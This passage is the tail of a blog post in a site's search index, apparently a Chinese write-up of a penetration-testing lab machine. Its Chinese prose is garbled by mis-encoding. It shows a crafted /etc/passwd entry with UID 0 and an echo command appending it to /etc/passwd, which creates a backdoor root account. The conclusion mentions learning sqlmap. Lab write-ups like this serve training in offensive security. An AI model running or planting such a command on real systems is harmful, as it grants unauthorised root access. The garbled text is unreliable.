class="language-text">x1nri:$1$x1nri$RuLBMKXnN1w.xtGk5bIT21:0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿½åŠ é‡å®šå‘åˆ°æœ«å°¾å³å¯ã€‚è®°å¾—è½¬ä¹‰$</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"x1nri:\<span class="token variable">$1</span>\<span class="token variable">$x1nri</span>\<span class="token variable">$RuLBMKXnN1w</span>.xtGk5bIT21:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/2dde81a003d363f0b9a2b03fca9564ce_MD5.jpeg"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>é€šè¿‡è¯¥é¶æœºï¼Œæˆ‘å­¦ä¹ åˆ°äº†</p><ul><li>æ›´åŠ æ·±å…¥äº†è§£äº†sqlmap</li></ul>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
